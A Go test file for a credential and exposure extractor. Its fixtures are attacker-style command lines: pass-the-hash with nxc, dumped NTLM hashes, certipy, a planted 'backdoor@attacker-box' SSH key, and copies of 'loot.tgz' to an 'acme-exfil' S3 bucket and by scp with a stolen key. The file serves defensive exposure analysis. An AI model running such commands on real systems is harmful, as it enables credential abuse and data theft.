package exposure

import (
	"maps"
	"slices"
	"strings"
	"testing"
)

func load(t *testing.T) Table {
	t.Helper()
	table, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	return table
}

// brief writes items as kind=value, with the account and the form of a
// secret, so a test states what it expects on one line.
func brief(items []Item) []string {
	out := make([]string, 0, len(items))
	for _, it := range items {
		s := it.Kind + "=" + it.Value
		if it.Account != "" {
			s += " of " + it.Account
		}
		if it.Form != "" && it.Form != it.Kind {
			s += " (" + it.Form + ")"
		}
		if it.Service != "" {
			s += " for " + it.Service
		}
		out = append(out, s)
	}
	return out
}

func TestExtractLines(t *testing.T) {
	table := load(t)
	tests := []struct {
		name string
		text string
		want []string
	}{
		{"a field", `Password: Zx9!fakeValue`, []string{"password=Zx9!fakeValue"}},
		{"a username and its password below it", "Username: sync@corp.example\n    Password: Zx9!fakeValue", []string{"username=sync@corp.example", "password=Zx9!fakeValue of sync@corp.example"}},
		{"a password too far below a username", "Username: bob\n\n\n\n\nPassword: Zx9!fakeValue", []string{"username=bob", "password=Zx9!fakeValue"}},
		{"both on one line", `user=alice password=Spring2026!`, []string{"username=alice", "password=Spring2026! of alice"}},
		{"fields that belong together by their names", "DB_USER=app_rw\nDB_PASSWORD=Fixture-Pass-01\nSMTP_USER=alerts\nAPI_TOKEN=fixture-token-0123", []string{"username=app_rw", "password=Fixture-Pass-01 of app_rw", "username=alerts", "password=fixture-token-0123 (token)"}},
		{"a quoted assignment", `PASS='Winter2025!'`, []string{"password=Winter2025!"}},
		{"a name that ends as a secret does", `MSOL_PASS="Qw7#fake"`, []string{"password=Qw7#fake for Microsoft 365"}},
		{"a token and a key by their names", "access_token=abcdef123456\napi_key: K-998877", []string{"password=abcdef123456 (token)", "apikey=K-998877 (key)"}},
		{"a variable given its value", "U=svc_backup\nP='Winter2025!'\nnxc smb 10.0.0.5 -u \"$U\" -p \"$P\"", []string{"username=svc_backup", "password=Winter2025! of svc_backup for 10.0.0.5"}},
		{"a variable inside a name", "N=msol\ncertipy find -u \"$N@corp.example\" -p 'Qw7#fake'", []string{"username=msol@corp.example", "password=Qw7#fake of msol@corp.example"}},
		{"a default value", `USER="${AD_USER:-svc_backup}"`, []string{"username=svc_backup"}},
		{"a domain before a name", `$User = 'CORP\svc_backup'`, []string{"username=svc_backup"}},
		{"a login that worked", `SMB  10.20.1.5   445  DC01   [+] corp.example\svc_backup:Winter2025! valid`, []string{"username=svc_backup", "device=DC01", "password=Winter2025! of svc_backup for DC01"}},
		{"a login that failed", `SMB  10.20.1.23  445  CA01   [-] corp.example\svc_backup:Winter2025! STATUS_LOGON_FAILURE`, []string{"username=svc_backup", "device=CA01"}},
		{"a dumped account", `Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C:::`, []string{"password=8846f7eaee8fb117ad06bdd830b7586c of Administrator (hash)", "username=Administrator"}},
		{"a hash named in prose", `[*] Got hash for 'administrator@corp.example': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`, []string{"password=8846f7eaee8fb117ad06bdd830b7586c of administrator@corp.example (hash)", "username=administrator@corp.example"}},
		{"a hash passed to a tool", `nxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "id"`, []string{"username=administrator", "password=8846f7eaee8fb117ad06bdd830b7586c of administrator (hash) for 10.20.1.23"}},
		{"a shadow line", `svc:$6$saltsalt$abcdefghijklmnop:19000:0:99999:7:::`, []string{"password=$6$saltsalt$abcdefghijklmnop of svc (hash)", "username=svc"}},
		{"a locked shadow line", `root:*:19000:0:99999:7:::`, nil},
		{"a passwd line", `svc:x:1001:1001:Service:/home/svc:/bin/bash`, []string{"username=svc"}},
		{"a password in an address", `mount //files01/share -o x; curl ftp://backup:Hunter22@files01.corp.local/x`, []string{"device=files01.corp.local", "password=Hunter22 of backup for files01.corp.local", "username=backup"}},
		{"a remote login", `ssh -i k ops@build01 'id'`, []string{"username=ops", "sshkey=k of ops (key file) for build01", "device=build01"}},
		{"a remote login by address", `ssh ops@198.51.100.7 'cat /etc/hostname'`, []string{"username=ops"}},
		{"a share", `net use \\FILES01\c$ /user:CORP\helper Passw0rd!x`, []string{"username=helper", "device=FILES01", "password=Passw0rd!x of helper for FILES01"}},
		{"a scan report", `Nmap scan report for dc01.corp.example (10.20.1.5)`, []string{"device=dc01.corp.example"}},
		{"a home folder", `ls -la /home/deploy/.ssh`, []string{"username=deploy"}},
		{"a profile folder", `dir C:\Users\j.smith\Desktop`, []string{"username=j.smith"}},
		{"a shared profile folder", `copy a.dll C:\Users\Public\a.dll`, nil},
		{"a registry path", `reg query HKLM\Software\Microsoft`, nil},
		{"a host and a certificate authority", `certutil.exe -config "CA01.corp.example\corp-CA01-CA" -ping`, nil},
		{"a host and what it serves", `Connecting to CA01.corp.example\corp-CA01-CA ...`, nil},
		{"a password for an exported key", `certutil -exportPFX -p Export1! My $T ca.p12`, []string{"password=Export1!"}},
		{"a secure string", `$p = ConvertTo-SecureString "Autumn2026!" -AsPlainText -Force`, []string{"password=Autumn2026!"}},
		{"a bearer token", `Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345`, []string{"password=abcdefghijklmnopqrstuvwxyz012345 (token)"}},
		{"a placeholder", "password=$PASS\nsecret: <redacted>\npwd=***\ntoken_type=Bearer\npassword: null", nil},
		{"an ldap filter", `ldapsearch "(sAMAccountName=MSOL_*)" sAMAccountName`, nil},
		{"a fully qualified name inside a longer one", `-subj "/CN=adfs.corp.example"`, nil},
		{"a short line", `a=b`, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := brief(table.Extract(tt.text)); !slices.Equal(got, tt.want) {
				t.Errorf("Extract(%q) =\n  %q, want\n  %q", tt.text, got, tt.want)
			}
		})
	}
}

func TestExtractRecords(t *testing.T) {
	table := load(t)
	tests := []struct {
		name string
		text string
		want []string
	}{
		{"a table with tabs", "account\thost\tdescription\nMSOL_0a1b\tAADC01\tsync account\nsvc_adsync\tAADC01\tservice", []string{"username=MSOL_0a1b", "device=AADC01", "username=svc_adsync", "device=AADC01"}},
		{"a quoted table", "\ufeff\"Name\",\"IPv4Address\",\"OperatingSystem\"\r\n\"DC01\",\"10.20.1.5\",\"Windows Server 2022\"\r\n", []string{"device=DC01"}},
		{"a name that is no device", "Name,Type\ncorp.example,AD\n", nil},
		{"a table with a secret", "username;password\nalice;Spring2026!\nbob;\n", []string{"username=alice", "password=Spring2026! of alice", "username=bob"}},
		{"an object", `{"userPrincipalName":"alice@corp.example","password":"Spring2026!","enabled":true,"id":7}`, []string{"username=alice@corp.example", "password=Spring2026! of alice@corp.example"}},
		{"objects in a list", `{"value":[{"userPrincipalName":"alice@corp.example"},{"userPrincipalName":"bob@corp.example"}]}`, []string{"username=alice@corp.example", "username=bob@corp.example"}},
		{"a nested object", `{"host":{"hostname":"web01"},"user":{"name":"x"},"client_secret":"s3cr3t-value"}`, []string{"device=web01", "password=s3cr3t-value (secret)"}},
		{"a command in a string", `{"cmd":"nxc smb 10.0.0.5 -u helper -p 'Autumn2026!'"}`, []string{"username=helper", "password=Autumn2026! of helper for 10.0.0.5"}},
		{"a list of strings", `["ssh ops@build01 id", 4, null]`, []string{"username=ops", "device=build01"}},
		{"what is not JSON after all", "{not json\nuser=alice\n", []string{"username=alice"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := brief(table.Extract(tt.text)); !slices.Equal(got, tt.want) {
				t.Errorf("Extract(%q) =\n  %q, want\n  %q", tt.text, got, tt.want)
			}
		})
	}
}

// A line number is the line of the text; a document of JSON Lines is its own line.
func TestExtractLineNumbers(t *testing.T) {
	table := load(t)
	lines := func(items []Item) []int {
		out := make([]int, len(items))
		for i, it := range items {
			out[i] = it.Line
		}
		return out
	}
	if got := lines(table.Extract("# notes\n\nuser=alice\npassword=Spring2026!\n")); !slices.Equal(got, []int{3, 4}) {
		t.Errorf("text lines = %v, want [3 4]", got)
	}
	if got := lines(table.Extract("{\"user\":\"alice\"}\n{\"note\":\"x\"}\n{\"user\":\"bob\"}\n")); !slices.Equal(got, []int{1, 3}) {
		t.Errorf("JSON Lines = %v, want [1 3]", got)
	}
	if got := lines(table.Extract("account,host\nalice,web01\nbob,web02\n")); !slices.Equal(got, []int{2, 2, 3, 3}) {
		t.Errorf("table rows = %v, want [2 2 3 3]", got)
	}
	long := "user=alice " + strings.Repeat("x", maxLine) + " password=Spring2026!"
	if got := brief(table.Extract(long)); !slices.Equal(got, []string{"username=alice"}) {
		t.Errorf("a line longer than the limit: %q, want what its first part holds", got)
	}
	if got := table.Extract("user=alice\nuser=alice\n"); len(got) != 2 {
		t.Errorf("the same value on two lines gives %d items, want one per line", len(got))
	}
	if got := table.Extract("user=alice user=alice\n"); len(got) != 1 {
		t.Errorf("the same value twice on a line gives %d items, want 1", len(got))
	}
}

func TestFromIndicator(t *testing.T) {
	table := load(t)
	tests := []struct {
		typ, value string
		want       Item
		ok         bool
	}{
		{"Email", "alice@corp.example", Item{Kind: "email", Value: "alice@corp.example", Line: 3}, true},
		{"IPv4", "10.20.1.5", Item{Kind: "ip", Value: "10.20.1.5", Line: 3}, true},
		{"JWT", "eyJhbGciOiJ.eyJzdWIiOiI.sig", Item{Kind: "password", Value: "eyJhbGciOiJ.eyJzdWIiOiI.sig", Form: "token", Line: 3}, true},
		{"PrivateKey", "-----BEGIN PRIVATE KEY-----", Item{Kind: "password", Value: "private key", Form: "key", Line: 3}, true},
		{"PrivateKey", "-----BEGIN RSA PRIVATE KEY-----", Item{}, false},
		{"AWSKey", "AKIAIOSFODNN7EXAMPLE", Item{Kind: "apikey", Value: "AKIAIOSFODNN7EXAMPLE", Form: "key", Service: "AWS", Line: 3}, true}, //nolint:gosec // G101: the key of the AWS documentation, which opens nothing.
		{"JWT", microsoftToken, Item{Kind: "password", Value: microsoftToken, Form: "token", Service: "Microsoft 365", Line: 3}, true},
		{"URL", "http://x", Item{}, false},
		{"IPv4", "127.0.0.1", Item{}, false},
		{"Email", "not an address", Item{}, false},
	}
	for _, tt := range tests {
		if got, ok := table.FromIndicator(tt.typ, tt.value, 3); got != tt.want || ok != tt.ok {
			t.Errorf("FromIndicator(%s) = %+v, %t; want %+v, %t", tt.typ, got, ok, tt.want, tt.ok)
		}
	}
	if got, want := table.IndicatorTypes(), []string{"AWSKey", "Domain", "Email", "IPv4", "JWT", "PrivateKey"}; !slices.Equal(got, want) {
		t.Errorf("IndicatorTypes = %q, want %q", got, want)
	}
}

// A domain is a hostname where a script names it, and of no kind elsewhere.
func TestFromHardcoded(t *testing.T) {
	table := load(t)
	if got, ok := table.FromHardcoded("Domain", "files.example.net", 4); !ok || got != (Item{Kind: "device", Value: "files.example.net", Line: 4}) {
		t.Errorf("FromHardcoded(Domain) = %+v, %t", got, ok)
	}
	if _, ok := table.FromIndicator("Domain", "files.example.net", 4); ok {
		t.Error("a domain is of a kind outside a script")
	}
	for typ, value := range map[string]string{"Email": "a@corp.example", "Domain": "localhost", "URL": "http://x"} {
		if got, ok := table.FromHardcoded(typ, value, 1); ok {
			t.Errorf("FromHardcoded(%s, %s) = %+v, want none", typ, value, got)
		}
	}
	titles := map[string]string{}
	for _, k := range table.Kinds() {
		titles[k.Name] = k.Targeted
	}
	want := map[string]string{
		"password": "", "username": "", "email": "Email addresses", "tenant": "", "sshkey": "", "apikey": "",
		"application": "", "resource": "", "device": "Hostnames", "ip": "IP addresses",
	}
	if !maps.Equal(titles, want) {
		t.Errorf("targeted titles = %v, want %v", titles, want)
	}
}

func TestKinds(t *testing.T) {
	var names []string
	for _, k := range load(t).Kinds() {
		names = append(names, k.Name)
		if k.Secret != (k.Name == "password" || k.Name == "apikey") {
			t.Errorf("%s: secret = %t", k.Name, k.Secret)
		}
		// An account says who signs in; a credential is what is signed in with.
		if k.Account != (k.Name == "username" || k.Name == "email") || k.Credential != (k.Secret || k.Name == "sshkey") {
			t.Errorf("%s: account = %t, credential = %t", k.Name, k.Account, k.Credential)
		}
	}
	if want := []string{"password", "username", "email", "tenant", "sshkey", "apikey", "application", "resource", "device", "ip"}; !slices.Equal(names, want) {
		t.Errorf("kinds = %q, want %q", names, want)
	}
}

func TestDecodeRejects(t *testing.T) {
	one := func(fields string) string {
		return `{"kinds":[{"name":"k","title":"K","severity":"low"` + fields + `}]}`
	}
	if _, err := decode([]byte(one(``))); err != nil {
		t.Fatalf("the smallest valid table: %v", err)
	}
	tests := map[string]string{
		"not json":                     `{`,
		"trailing data":                one(``) + ` x`,
		"unknown field":                one(`,"extra":1`),
		"no kinds":                     `{"kinds":[]}`,
		"no title":                     `{"kinds":[{"name":"k","severity":"low"}]}`,
		"named twice":                  `{"kinds":[{"name":"k","title":"K","severity":"low"},{"name":"k","title":"K","severity":"low"}]}`,
		"a key in upper case":          one(`,"keys":["User"]`),
		"a key twice":                  one(`,"keys":["user","user"]`),
		"a key in two kinds":           `{"kinds":[{"name":"a","title":"A","severity":"low","keys":["user"]},{"name":"b","title":"B","severity":"low","keys":["user"]}]}`,
		"a key beside nothing":         one(`,"with":{"name":[]}`),
		"a key with and without":       one(`,"keys":["name"],"with":{"name":["os"]}`),
		"a short ending":               one(`,"suffixes":[{"suffix":"ab"}]`),
		"an indicator twice":           one(`,"indicators":[{"type":"Email"},{"type":"Email"}]`),
		"an indicator with no type":    one(`,"indicators":[{"form":"x"}]`),
		"a bad valid":                  one(`,"valid":"("`),
		"a bad reject":                 one(`,"reject":"("`),
		"a bad placeholder":            `{"placeholder":"(","kinds":[{"name":"k","title":"K","severity":"low"}]}`,
		"a bad pattern":                one(`,"patterns":[{"needs":["a"],"pattern":"("}]`),
		"a pattern without a value":    one(`,"patterns":[{"needs":["a"],"pattern":"(a)"}]`),
		"a pattern that needs nothing": one(`,"patterns":[{"needs":[],"pattern":"(?P<value>a)"}]`),
		"a needed text in upper case":  one(`,"patterns":[{"needs":["A"],"pattern":"(?P<value>a)"}]`),
		"a bad unless":                 one(`,"patterns":[{"needs":["a"],"unless":"(","pattern":"(?P<value>a)"}]`),
		"targeted without a title":     one(`,"targeted":{}`),
		"a secret that is targeted":    one(`,"secret":true,"targeted":{"title":"T"}`),
		"a targeted type twice":        one(`,"targeted":{"title":"T","indicators":[{"type":"Domain"},{"type":"Domain"}]}`),
		"a targeted type of the kind":  one(`,"indicators":[{"type":"Email"}],"targeted":{"title":"T","indicators":[{"type":"Email"}]}`),
		"an account that is a secret":  one(`,"account":true,"secret":true`),
		"an account and a credential":  one(`,"account":true,"credential":true`),
		"an excepted name in capitals": one(`,"except":["NoPasswd"]`),
		"a vendor in capitals":         `{"vendors":["Example.com"],` + one(``)[1:],
		"a vendor with an address":     `{"vendors":["https://example.com"],` + one(``)[1:],
		"a vendor twice":               `{"vendors":["example.com",".example.com"],` + one(``)[1:],
		"a vendor that is a dot":       `{"vendors":["."],` + one(``)[1:],
		"a token with no owner":        `{"token":{"audience":["aud"],"shown":["aud"]},` + one(``)[1:],
		"a token with an empty claim":  `{"token":{"owner":[""],"audience":["aud"],"shown":["aud"]},` + one(``)[1:],
		"a service host in capitals":   `{"services":[{"name":"S","hosts":["API.example.com"]}],` + one(``)[1:],
		"a service host that is a dot": `{"services":[{"name":"S","hosts":["."]}],` + one(``)[1:],
	}
	for name, data := range tests {
		t.Run(name, func(t *testing.T) {
			if _, err := decode([]byte(data)); err == nil {
				t.Errorf("decode(%s) gave no error", data)
			}
		})
	}
}

// microsoftToken is a JSON web token whose claims name the issuer of Microsoft:
// {"iss":"https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/"}.
//
//nolint:gosec // G101: a made-up token with no signature of any key.
const microsoftToken = "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC82Zjk2MTlmZi04Yjg2LTRkMTEtYjQyZC0wMGMwNGZjOTY0ZmYvIn0.c2lnbmF0dXJl"

// The exposure names the tenants, the SSH keys with their hosts, the API
// keys with their services, and what is of Microsoft 365 and Google Cloud.
func TestExtractServices(t *testing.T) {
	table := load(t)
	const guid, app = "6f9619ff-8b86-4d11-b42d-00c04fc964ff", "1b2c3d4e-5f60-4718-8293-a4b5c6d7e8f9"
	const key = "AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y"
	const printed = "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU"
	tests := []struct {
		name, text string
		want       []string
	}{
		{"a tenant by its field", "AZURE_TENANT_ID=" + guid, []string{"tenant=" + guid + " for Microsoft 365"}},
		{"a tenant in the address of a login", "curl https://login.microsoftonline.com/" + guid + "/oauth2/v2.0/token", []string{"tenant=" + guid + " for Microsoft 365"}},
		{"a tenant by its domain", "Connect-MgGraph -TenantId contoso.onmicrosoft.com", []string{"tenant=contoso.onmicrosoft.com for Microsoft 365"}},
		{"no tenant that is every tenant", "curl https://login.microsoftonline.com/common/oauth2/token", nil},
		{"an application of Microsoft", "client_id: " + app, []string{"application=" + app + " for Microsoft 365"}},
		{"an application of Google", "client_id=1234567890-abc123def456.apps.googleusercontent.com", []string{"application=1234567890-abc123def456.apps.googleusercontent.com for Google Cloud"}},
		{"a secret of a client of Microsoft", `AZURE_CLIENT_SECRET="Qz8~fakeClientSecretValue.0123456789abc"`, []string{"password=Qz8~fakeClientSecretValue.0123456789abc (secret) for Microsoft 365"}},
		{"a site of SharePoint", "curl https://contoso.sharepoint.com/sites/finance", []string{"resource=contoso.sharepoint.com (site) for Microsoft 365"}},
		{"a project and a bucket of Google", "gcloud compute instances list --project=acme-prod-4711\ngsutil ls gs://acme-prod-backups/", []string{"resource=acme-prod-4711 (project) for Google Cloud", "resource=gs://acme-prod-backups (bucket) for Google Cloud"}},
		{"a project by its field", `"project_id": "acme-prod-4711"`, []string{"resource=acme-prod-4711 (project) for Google Cloud"}},
		{"a bucket of AWS", "aws s3 cp loot.tgz s3://acme-exfil/loot.tgz", []string{"resource=s3://acme-exfil (bucket) for AWS"}},
		{"a key by its form", "curl -H 'x: ghp_Ab3dE9fGh1JkLm5nPq7RsTu2VwXy4Z0c8Ab3' https://api.github.com/user", []string{"apikey=ghp_Ab3dE9fGh1JkLm5nPq7RsTu2VwXy4Z0c8Ab3 (key) for GitHub"}},
		{"a key by the name of its field", "OPENAI_API_KEY=not-in-the-usual-form-123", []string{"apikey=not-in-the-usual-form-123 (key) for OpenAI"}},
		{"a key of no known service", "INTERNAL_API_KEY=9f8e7d6c5b4a3928", []string{"apikey=9f8e7d6c5b4a3928 (key)"}},
		{"a key of AWS by its field", "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", []string{"apikey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY (key) for AWS"}},
		{"a key of Anthropic and not of OpenAI", "ANTHROPIC=sk-ant-api03-Ab3dE9fGh1JkLm5nPq7RsTu2VwXy", []string{"apikey=sk-ant-api03-Ab3dE9fGh1JkLm5nPq7RsTu2VwXy (key) for Anthropic"}},
		{"no key inside a longer word", "see task-sk-0123456789abcdefghijklmnop and risk-0123456789abcdefghijklmnop", nil},
		{"a public key and whose it is", "ssh-ed25519 " + key + " backdoor@attacker-box", []string{"username=backdoor", "sshkey=" + printed + " of backdoor (public key) for attacker-box", "device=attacker-box"}},
		{"a public key with a note that is no host", "ssh-ed25519 " + key + " backup key", []string{"sshkey=" + printed + " (public key)"}},
		{"the key of a known host", "bastion01.corp.internal,10.20.30.7 ssh-ed25519 " + key, []string{"sshkey=" + printed + " (public key) for bastion01.corp.internal", "sshkey=" + printed + " (public key)", "device=bastion01.corp.internal"}},
		{"the key of a known host and port", "[git.corp.internal]:2222 ssh-ed25519 " + key, []string{"sshkey=" + printed + " (public key) for git.corp.internal:2222", "sshkey=" + printed + " (public key)", "device=git.corp.internal"}},
		{"a private key of SSH", "-----BEGIN OPENSSH PRIVATE KEY-----", []string{"sshkey=OPENSSH PRIVATE KEY (private key)"}},
		{"a key file and the host it opens", "scp -i /tmp/stolen_key loot.tgz deploy@bastion01:/tmp/", []string{"username=deploy", "sshkey=/tmp/stolen_key of deploy (key file) for bastion01", "device=bastion01"}},
		{"an account of a service of Google", "mail: deployer@acme-prod-4711.iam.gserviceaccount.com", []string{"email=deployer@acme-prod-4711.iam.gserviceaccount.com for Google Cloud"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := brief(table.Extract(tt.text)); !slices.Equal(got, tt.want) {
				t.Errorf("Extract(%q) =\n  %q, want\n  %q", tt.text, got, tt.want)
			}
		})
	}
	groups := 0
	for _, s := range table.Services() {
		if s.Group {
			groups++
		}
	}
	if groups != 2 || len(table.Services()) < 10 {
		t.Errorf("%d services, %d with a group of their own, want Microsoft 365 and Google Cloud among ten or more", len(table.Services()), groups)
	}
}

func TestWords(t *testing.T) {
	for key, want := range map[string][]string{
		"GITHUB_TOKEN": {"github", "token"}, "ghToken": {"gh", "token"}, "aws.secret-access_key": {"aws", "secret", "access", "key"},
		"OpenAIKey": {"open", "aikey"}, "x": {"x"}, "": nil, "__": nil,
	} {
		if got := words(key); !slices.Equal(got, want) {
			t.Errorf("words(%q) = %q, want %q", key, got, want)
		}
	}
}

func TestFingerprint(t *testing.T) {
	for key, want := range map[string]string{
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y":      "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU",
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y note": "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU",
		"ssh-rsa not*base64": "ssh-rsa not*base64",
		"alone":              "alone",
	} {
		if got := fingerprint(key); got != want {
			t.Errorf("fingerprint(%q) = %q, want %q", key, got, want)
		}
	}
}
